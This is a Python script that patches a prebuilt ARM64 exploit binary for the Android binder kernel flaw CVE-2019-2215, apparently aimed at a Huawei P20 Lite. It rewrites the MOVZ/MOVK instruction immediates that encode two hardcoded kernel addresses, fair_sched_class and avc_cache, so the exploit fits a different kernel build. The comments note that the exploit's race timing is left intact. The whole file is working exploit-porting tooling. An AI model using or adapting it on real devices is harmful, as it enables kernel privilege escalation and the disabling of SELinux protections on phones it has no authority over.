#!/usr/bin/env python3
"""Patch the two hardcoded kernel addresses inside the pristine exploit binary.

They are not stored as 8-byte literals (that search found nothing) but built with
movz + movk sequences, so this rewrites the immediate fields of those instructions.

  FAIR_SCHED_CLASS  0xffffff8008f78408 -> 0xffffff8008f48408   (hw1: 0x08f7 -> 0x08f4)
  AVC_CACHE         0xffffff800a2d4c40 -> 0xffffff800a276c40   (hw0 0x4c40 -> 0x6c40,
                                                                hw1 0x0a2d -> 0x0a27)

Patching only immediates leaves layout, sizes and the race timing untouched,
which is the whole point: the pristine binary wins the race, the rebuilt one does
not.

ARM64 encoding:
  MOVZ Xd, #imm16, LSL #(16*hw)  = 0xD2800000 | (hw<<21) | (imm16<<5) | Rd
  MOVK Xd, #imm16, LSL #(16*hw)  = 0xF2800000 | (hw<<21) | (imm16<<5) | Rd
"""
import struct
import sys

SRC = "/home/placeless/dev/p20lite-cve/libs/arm64-v8a/cve-2019-2215"
DST = "/tmp/cve_fixed2"

MOVZ = 0xD2800000
MOVK = 0xF2800000
MASK = 0x7FFFFFE0          # keep opcode + hw + imm16, drop Rd


def words(value):
    """the (opcode, hw, imm) sequence a 64-bit constant is built from"""
    seq = []
    for hw in range(4):
        imm = (value >> (16 * hw)) & 0xFFFF
        if hw == 0:
            seq.append((MOVZ, hw, imm))
        else:
            seq.append((MOVK, hw, imm))
    return seq


def find_seq(d, seq):
    """offsets where the 4-instruction sequence appears (Rd ignored)"""
    hits = []
    n = len(d) // 4
    for i in range(n - 3):
        ok = True
        for k, (op, hw, imm) in enumerate(seq):
            w = struct.unpack_from("<I", d, (i + k) * 4)[0]
            if (w & MASK) != (op | (hw << 21) | (imm << 5)):
                ok = False
                break
        if ok:
            hits.append(i * 4)
    return hits


d = bytearray(open(SRC, "rb").read())
print(f"binary: {SRC} ({len(d):,} bytes)")

patched = 0
for name, old, new in (("FAIR_SCHED_CLASS", 0xFFFFFF8008F78408, 0xFFFFFF8008F48408),
                       ("AVC_CACHE",       0xFFFFFF800A2D4C40, 0xFFFFFF800A276C40)):
    oldseq, newseq = words(old), words(new)
    hits = find_seq(d, oldseq)
    print(f"\n{name}: old {old:#018x} -> new {new:#018x}")
    print(f"  movz/movk sequences found: {len(hits)} at {[hex(h) for h in hits]}")
    for off in hits:
        for k in range(4):
            if oldseq[k] == newseq[k]:
                continue
            op, hw, imm = newseq[k]
            w = struct.unpack_from("<I", d, off + k * 4)[0]
            rd = w & 0x1F
            nw = op | (hw << 21) | (imm << 5) | rd
            struct.pack_into("<I", d, off + k * 4, nw)
            print(f"    +{k*4:#x}: imm {oldseq[k][2]:#06x} -> {imm:#06x} (rd=x{rd})")
            patched += 1

open(DST, "wb").write(bytes(d))
print(f"\nwrote {DST}, {patched} instruction word(s) rewritten, size {len(d):,}")
